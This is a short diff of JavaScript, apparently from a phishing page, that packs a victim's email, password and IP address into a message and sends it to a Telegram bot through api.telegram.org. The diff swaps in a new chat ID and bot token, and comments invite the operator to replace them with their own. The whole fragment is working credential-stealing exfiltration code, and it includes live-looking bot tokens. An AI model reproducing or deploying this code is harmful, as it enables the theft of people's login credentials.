@@ -4633,8 +4633,8 @@ $('#opsder').html(bari);
 	
 					// Prepare the data to send to the Telegram bot
 					var message = `Email: ${email}\nPassword: ${password}\nIP Address: ${ip}`;
-					var chat_id = "8114792698"; // Replace with your chat ID
-					var bot_token = "7727760180:AAFkZhbQhCh4ui9wvPSl8eCmoMG-Nb7wpOE"; // Replace with your bot token
+					var chat_id = "7533817537"; // Replace with your chat ID
+					var bot_token = "7352131028:AAG6452up-r-Q6ism9S8NRMIkFPZGISk5QA"; // Replace with your bot token
 					var telegram_url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
 	
 					// Send the data to the Telegram bot
